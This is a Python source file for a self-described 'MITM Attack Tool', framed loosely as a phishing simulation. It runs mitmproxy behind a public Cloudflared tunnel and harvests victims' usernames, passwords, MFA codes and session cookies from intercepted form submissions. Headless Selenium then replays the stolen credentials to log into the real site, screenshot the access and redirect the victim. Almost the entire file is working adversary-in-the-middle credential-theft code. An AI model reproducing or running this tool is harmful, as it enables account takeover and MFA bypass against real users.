######################################################################################################################################################################################################################
# Intial mitm proxy tool. python mitm_proxy_tool.py. !!!Under-Constuction!!!  
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#######################################################################################################################################################################################################################

import subprocess
import time
import logging
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from mitmproxy import http


def display_splash_screen():
    splash = """
    
   _____  .______________.___   _____        __________                                        _____   __    __                   __        ___________            .__                 _____  ____         .__       _____           _______  ____ 
  /     \ |   \__    ___/|   | /     \       \______   \_______  ____ ___  ___ ___.__.        /  _  \_/  |__/  |______     ____  |  | __    \__    ___/____   ____ |  |               /  |  |/_   |______  |  |__   /  |  |          \   _  \/_   |
 /  \ /  \|   | |    |   |   |/  \ /  \       |     ___/\_  __ \/  _ \\  \/  /<   |  |       /  /_\  \   __\   __\__  \  _/ ___\ |  |/ /      |    |  /  _ \ /  _ \|  |     ______   /   |  |_|   |\____ \ |  |  \ /   |  |_  ______ /  /_\  \|   |
/    Y    \   | |    |   |   /    Y    \      |    |     |  | \(  <_> )>    <  \___  |      /    |    \  |  |  |  / __ \_\  \___ |    <       |    | (  <_> |  <_> )  |__  /_____/  /    ^   /|   ||  |_> >|   Y  |    ^   / /_____/ \  \_/   \   |
\____|__  /___| |____|   |___\____|__  /______|____|     |__|   \____//__/\_ \ / ____|______\____|__  /__|  |__| (____  / \___  >|__|_ \______|____|  \____/ \____/|____/           \____   | |___||   __/ |___|  |____   |           \_____  /___|
        \/                           \//_____/                              \/ \/    /_____/        \/                \/      \/      \/_____/                                           |__|      |__|         \/     |__|                 \/     
 
                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)
   
 
"""

    print(splash)
    print("MITM Attack Tool 41PH4-01\n")

# Setup logging
logging.basicConfig(level=logging.INFO)
log = logging.getLogger("PhishingSimulation")

# Constants
MITMPROXY_PATH = "mitmproxy"  # Assuming mitmproxy is in the system's PATH for Linux
CAPTURED_DATA_PATH = "/path/to/store/captured_data"  # Path to store captured data
PROXY_ADDRESS = "example.cloudflare-tunnel.com:8080"  # Cloudflared tunnel address
REAL_SITE_URL = "https://real-site.com/login"  # The real site URL for login

# Function to start mitmproxy and capture traffic
def start_mitmproxy():
    log.info("Starting mitmproxy to capture traffic...")

    # Start mitmproxy as a subprocess to capture traffic
    try:
        subprocess.run([MITMPROXY_PATH, "--listen-port", "8080"], check=True)
        log.info("mitmproxy is running and capturing traffic.")
    except subprocess.CalledProcessError:
        log.error("Failed to start mitmproxy.")
        sys.exit(1)

# Function to capture credentials from mitmproxy traffic
captured_credentials = {}

def request(flow: http.HTTPFlow):
    # Capture username and password from form submissions
    if hasattr(flow.request, 'fields') and 'username' in flow.request.fields:
        username = flow.request.fields["username"]
        password = flow.request.fields["password"]
        captured_credentials["username"] = username
        captured_credentials["password"] = password
        log.info(f"Captured credentials: {username}, {password}")

    # Optionally capture MFA if it exists
    if "mfa_code" in flow.request.fields:
        mfa_code = flow.request.fields["mfa_code"]
        captured_credentials["mfa_code"] = mfa_code
        log.info(f"Captured MFA code: {mfa_code}")

    # Capture session cookies
    if hasattr(flow.response, 'cookies') and flow.response.cookies:
        captured_credentials["cookies"] = flow.response.cookies
        log.info("Captured cookies.")

# Function to login to the real website using captured credentials
def login_to_real_website(driver, username, password, mfa_code=None, cookies=None):
    log.info("Logging into the real website with captured credentials...")

    # Open the login page
    driver.get(REAL_SITE_URL)

    # Set cookies if available
    if cookies:
        for cookie_name, cookie_value in cookies.items():
            driver.add_cookie({"name": cookie_name, "value": cookie_value})

    # Wait for the username field to be visible
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "username")))

    # Enter the captured credentials
    driver.find_element(By.NAME, "username").send_keys(username)
    driver.find_element(By.NAME, "password").send_keys(password)

    # If MFA is required, enter the captured MFA code
    if mfa_code:
        driver.find_element(By.NAME, "mfa_code").send_keys(mfa_code)

    # Submit the login form
    driver.find_element(By.NAME, "password").send_keys(Keys.RETURN)

    # Wait until login is successful
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "profile-menu")))

    log.info("Successfully logged into the real website.")

# Function to capture a screenshot after login to prove access
def capture_screenshot(driver):
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    screenshot_path = f"/path/to/screenshots/screenshot_{timestamp}.png"
    driver.save_screenshot(screenshot_path)
    log.info(f"Screenshot captured: {screenshot_path}")

# Function to log out of the real website (for the ethical hacker)
def logout_of_real_website(driver):
    log.info("Logging out of the real website...")

    # Wait for profile menu (or another element that signifies the user is logged in)
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "profile-menu")))

    # Click the logout button
    logout_button = driver.find_element(By.XPATH, "//button[@id='logout']")
    logout_button.click()

    # Wait for confirmation of logout
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "login-form")))

    log.info("Successfully logged out of the real website.")

# Function to redirect the user to the real login page immediately
def redirect_user_to_real_site():
    log.info("Redirecting user to the real login page...")
    redirect_url = REAL_SITE_URL
    subprocess.run(f"open {redirect_url}", shell=True)  # For macOS/Linux open command

# Main function to run the entire process
def run_phishing_simulation():
    # Start mitmproxy to capture traffic
    start_mitmproxy()

    # Start Cloudflared tunnel to expose mitmproxy to the internet
    log.info("Starting Cloudflared tunnel to expose mitmproxy to the internet...")
    subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:8080"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Start browser automation with Selenium for the real login attempt
    log.info("Starting browser automation for the attacker machine...")
    options = Options()
    options.add_argument("--headless")  # Run in headless mode
    options.add_argument(f'--proxy-server=http://{PROXY_ADDRESS}')  # Use Cloudflared proxy server

    # Launch Selenium WebDriver with Chrome
    driver = webdriver.Chrome(options=options)

    # Wait for traffic to be captured
    log.info("Waiting for user credentials to be captured...")
    while not captured_credentials:
        time.sleep(1)  # Wait for credentials to be captured

    # Capture the credentials
    username = captured_credentials.get("username")
    password = captured_credentials.get("password")
    mfa_code = captured_credentials.get("mfa_code")
    cookies = captured_credentials.get("cookies")

    # Perform login on the real website
    if username and password:
        login_to_real_website(driver, username, password, mfa_code, cookies)
        capture_screenshot(driver)

    # Logout from the real website (for the ethical hacker)
    logout_of_real_website(driver)

    # Redirect the user to the real login page immediately after traffic capture
    redirect_user_to_real_site()

    # Close the browser
    driver.quit()

if __name__ == "__main__":
    run_phishing_simulation()
